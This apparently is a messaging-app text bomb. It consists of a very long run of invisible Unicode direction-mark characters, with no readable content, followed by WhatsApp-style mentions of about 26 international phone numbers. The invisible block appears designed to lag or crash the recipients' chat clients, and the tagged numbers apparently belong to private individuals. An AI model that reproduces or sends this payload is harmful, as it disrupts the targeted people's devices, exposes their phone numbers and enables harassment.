‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ 